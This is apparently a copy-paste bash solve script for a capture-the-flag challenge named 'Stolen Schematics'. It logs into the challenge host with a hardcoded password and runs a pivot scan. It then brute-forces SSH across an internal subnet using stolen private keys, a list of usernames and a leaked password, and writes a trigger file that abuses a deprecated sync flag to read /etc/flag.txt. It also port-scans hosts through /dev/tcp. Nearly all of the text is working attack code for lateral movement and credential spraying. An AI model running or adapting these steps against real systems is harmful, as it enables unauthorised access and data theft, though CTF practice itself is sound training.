#!/bin/bash

# Stolen Schematics Final Solve Script
# Copy-paste this entire script into your Kali terminal

sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p 32887 player@instance.ctf.tdho.st << 'REMOTE_EOF'

echo "========================================="
echo "[*] STOLEN SCHEMATICS - FINAL SOLVE"
echo "========================================="

# First, let's see what the pivot_scan.py outputs
echo ""
echo "[*] Running pivot_scan.py (full output)..."
python3 /tmp/pivot_scan.py 2>&1

echo ""
echo "========================================="
echo "[*] Manual SSH attempts with keys..."
echo "========================================="

chmod 600 /tmp/key_1.pem /tmp/key_2.pem 2>/dev/null

# Try all combinations manually
for ip in 172.27.0.{1..13}; do
    echo "[*] Trying $ip..."
    
    for key in /tmp/key_1.pem /tmp/key_2.pem; do
        for user in root player admin mc gameserver ubuntu; do
            # Try SSH with timeout
            timeout 2 ssh -i $key -o StrictHostKeyChecking=no -o ConnectTimeout=1 \
                $user@$ip "id 2>/dev/null; echo '[SUCCESS] Connected as $user@$ip'; ls -la /opt/mc/.sync/ 2>/dev/null; cat /etc/flag.txt 2>/dev/null; cat /opt/mc/sync.log 2>/dev/null" 2>/dev/null && {
                echo "[+++] SUCCESS: $user@$ip with $key"
                
                # If we got in, try to trigger watcher
                echo "[*] Attempting to trigger watcher.sh..."
                ssh -i $key -o StrictHostKeyChecking=no $user@$ip << 'INNER_EOF'
echo "FILE-READ:/etc/flag.txt?talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true" > /opt/mc/.sync/sync.trigger 2>/dev/null
sleep 3
echo "[*] Checking for flag in logs..."
find /opt/mc -name "*.log" -type f 2>/dev/null | xargs cat 2>/dev/null | grep -i "TDHT{"
cat /etc/flag.txt 2>/dev/null | grep -i "TDHT{"
INNER_EOF
            }
        done
    done
done

echo ""
echo "========================================="
echo "[*] Checking if watcher is on THIS container (172.27.0.3)..."
echo "========================================="

# Check if watcher.sh process is running here
ps aux | grep watcher
pgrep -a watcher

# Try with password-based auth
echo ""
echo "[*] Trying password: dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ"
for ip in 172.27.0.{1..13}; do
    sshpass -p "dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 \
        player@$ip "echo '[SUCCESS] Password auth to player@$ip'; ls -la /opt/mc/.sync/; cat /etc/flag.txt 2>/dev/null" 2>/dev/null && {
        echo "[+++] Password worked for player@$ip"
    }
done

echo ""
echo "========================================="
echo "[*] FINAL: Checking all accessible services..."
echo "========================================="

# Scan for open ports
for ip in 172.27.0.{1..13}; do
    timeout 1 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null && echo "[*] SSH open on $ip"
    timeout 1 bash -c "echo > /dev/tcp/$ip/80" 2>/dev/null && echo "[*] HTTP open on $ip"
    timeout 1 bash -c "echo > /dev/tcp/$ip/5000" 2>/dev/null && echo "[*] Port 5000 open on $ip"
done

echo ""
echo "[*] Search complete!"

REMOTE_EOF
